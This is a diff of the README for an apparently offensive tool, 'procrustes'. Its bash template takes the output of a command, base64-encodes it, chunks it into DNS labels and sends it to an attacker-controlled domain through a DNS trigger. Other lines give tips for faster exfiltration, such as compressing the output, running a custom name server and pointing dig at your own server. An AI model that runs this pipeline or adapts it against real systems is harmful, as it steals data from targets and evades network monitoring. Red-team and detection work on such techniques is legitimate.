@@ -67,7 +67,7 @@ procroustes_chunked/bash:
 ```
 procroustes_full/bash:
 ```bash
-((%CMD%);printf '\n%SIGNATURE%')|base64 -w0|grep -Eo '.{1,%LABEL_SIZE%}'|xargs -n%NLABELS% echo|tr ' ' .|nl|awk '{printf "%s.%s%s\n",$2,$1,"%UNIQUE_DNS_HOST%"}'|xargs -P%THREADS% -n1 %DNS_TRIGGER%
+(%CMD%)|base64 -w0|echo $(cat)--|grep -Eo '.{1,%LABEL_SIZE%}'|xargs -n%NLABELS% echo|tr ' ' .|nl|awk '{printf "%s.%s%s\n",$2,$1,"%UNIQUE_DNS_HOST%"}'|xargs -P%THREADS% -n1 %DNS_TRIGGER%
 ```
 procroustes_full/bash/staged:
 ```bash
@@ -94,7 +94,7 @@ A workaround to avoid running into issues for the aforementioned cases is to fir
  - In case long text output is expected, you can try compressing it first to speed up the exfil process, e.g. ./procrustes_full.sh ... -o >(gzip -d) -- 'ls -lhR / | gzip'
  - Another possibility for big/binary files is to copy them to a path which is accessible for example through HTTP
  - For increased exfil bandwidth, run the staged_files/dnsns.py on your name server. That way, we avoid waiting for the underlying DNS_TRIGGER to timeout before moving on to a new chunk. This is especially usefull in the case of procroustes_full/powershell where we currently have no parallelization.
- - Ideally, you would have a domain (-h option) with an NS record pointing to a server you control (server where we run tcpdump). Nevertheless, in case the target is allowed to initiate connections to arbitrary DNS servers, this can be avoided by having the DNS trigger exclicitly using your DNS server (e.g. dig @your_server whatev.er)
+ - Ideally, you would have a domain (-h option) with an NS record pointing to a server you control (server where we run tcpdump). Nevertheless, in case the target is allowed to initiate connections to arbitrary DNS servers, this can be avoided by having the DNS trigger explicitly set to use our DNS server (e.g. dig @your_server whatev.er)
 
 ### Todos
  - Create a wrapper script, that will contain variables (e.g. host=a, dns_trigger=b, dispatcher=c ...) and will translate them to procrustes commands (e.g. ./procrustes_full.sh -h a -d b -x c -- "$1")
